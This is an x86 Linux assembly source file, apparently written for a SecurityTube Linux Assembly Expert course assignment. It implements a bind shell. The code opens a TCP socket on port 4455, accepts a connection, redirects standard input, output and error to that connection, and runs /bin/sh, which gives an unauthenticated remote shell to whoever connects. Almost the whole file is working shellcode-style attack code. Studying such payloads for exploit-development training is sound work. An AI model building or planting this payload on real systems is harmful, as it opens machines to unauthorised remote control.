; Filename: bindshell.nasm
; Author: aus-mate
; 
; Purpose: This code was written for assignment #1 of the SecurityTube Linux Assembly Expert certification.
; Student ID: SLAE-1555


global _start

section .text

_start:
	; syscalls: cat /usr/include/i386-linux-gnu/asm/unistd_32.h
	
	; socket(AF_NET, SOCK_STREAM, IPPROTO_TCP)		
	xor eax, eax 		; clear eax
	mov ax, 0x167 		; syscall socket
	xor ebx, ebx 		; clear ebx
	mov bl, 0x2 		; AF_INET = 2
	xor ecx, ecx 		; clear ecx
	mov cl, 0x1 		; SOCK_STREAM = 1
	xor edx, edx 		; clear edx register, IPPROTO_TCP = 0		
	int 0x80		; execute syscall

	mov ebx, eax 		; store sockfd


	; bind(sockfd, struct sockaddr, addrlen)
	mov ax, 0x169 		; syscall bind

	; struct sockaddr_in {
        ;        sa_family_t    sin_family; /* address family: AF_INET */
        ;        in_port_t      sin_port;   /* port in network byte order */
        ;        struct in_addr sin_addr;   /* internet address */
	; };

	; struct - Remember to push in reverse LIFO
	push edx		; in_addr = 0
	push word 0x6711	; port (4455) in network byte order
	push word 0x2		; AF_INET
	mov ecx, esp		; set the pointer to the struct

	mov dl, 0x10		; addrlen = 16
	int 0x80		; execute syscall


	; listen(sockfd, backlog)
	mov ax, 0x16b		; syscall listen
	xor ecx, ecx		; clear ecx
	int 0x80		; execute syscall

	
	; accept4(sockfd, struct sockaddr, addrlen)
	mov ax, 0x16c		; syscall accept
	xor edx, edx		; Don't care about the client
	int 0x80		; execute syscall

	mov ebx, eax		; store client sockfd

	mov cl, 0x3		; Move 3 into ecx for the loop operation
	mov esi, 0xFFFFFFFD	; Move -3 into esi
dup:
        ; dup2(oldfd, newfd)
        push ecx		; push ecx onto the stack
        xor eax, eax		; clear eax
	add ecx, esi		; alter ecx to desired value on each loop (0, 1, 2)
        mov al, 0x3f            ; syscall dup2
        int 0x80                ; execute syscall
	add esi, 0x2 		; add 2 to esi for ecx calculation
        pop ecx			; return the previous value of ecx
        loop dup		; loop
	

	; execve
	xor eax, eax		; clear eax
	push eax		; push 0s into the stack - to use as null terminator
	mov al, 0xb		; syscall execve
	push 0x68732f2f		; /bin//sh
	push 0x6e69622f
	mov ebx, esp		; set pointer to /bin//sh
	xor ecx, ecx		; null argv
	int 0x80		; execute syscall
